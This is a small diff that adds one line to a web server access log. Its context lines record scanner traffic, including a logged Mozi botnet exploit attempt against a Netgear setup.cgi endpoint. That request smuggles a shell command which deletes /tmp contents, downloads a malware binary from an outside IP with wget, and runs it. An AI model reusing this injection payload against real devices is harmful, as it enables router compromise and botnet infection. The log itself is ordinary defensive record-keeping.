@@ -151,3 +151,4 @@
 20.150.209.191 - - [26/Aug/2021:13:39:09 +0000] "GET http://azenv.net/ HTTP/1.1" 200 12076 "-" "Go-http-client/1.1"
 119.162.235.48 - - [26/Aug/2021:13:46:50 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://119.162.235.48:58415/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 451 "-" "-"
 213.186.1.246 - - [26/Aug/2021:13:47:37 +0000] "GET /robots.txt HTTP/1.1" 404 492 "-" "Mediatoolkitbot (complaints@mediatoolkit.com)"
+34.224.81.246 - - [26/Aug/2021:13:50:28 +0000] "GET / HTTP/1.1" 200 12076 "-" "Go-http-client/1.1"
